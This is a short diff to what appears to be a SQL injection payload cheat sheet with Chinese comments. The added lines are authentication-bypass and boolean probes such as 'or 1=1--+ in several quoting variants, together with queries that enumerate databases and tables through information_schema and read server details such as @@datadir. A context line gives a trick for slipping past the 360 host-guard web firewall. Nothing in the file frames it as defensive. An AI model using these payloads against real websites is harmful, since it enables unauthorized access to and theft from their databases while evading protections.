@@ -3,6 +3,25 @@ id=1' and '1'='2
 id=1) and 1=1  -- M
 id=1 and 1=1 --+
 
+and 1=1
+' and '1'='1
+
+or 1=1--+
+'or 1=1--+
+"or 1=1--+
+)or 1=1--+
+')or 1=1--+
+") or 1=1--+
+"))or 1=1--+
+or not 1=1# 和 or not 1=2  #基于update注入判断
+
+version()           
+user()               
+database()   
+group_concat(schema_name) from information_schema.schemata  #查询所有数据库
+group_concat(table_name) from information_schema.tables where table_schema=database()  #查询当前数据库
+@@datadir            
+@@version_compile_os 
 
 过360主机卫士 
 在注入关键字后加%23%0a（也就是注释符和换行符）
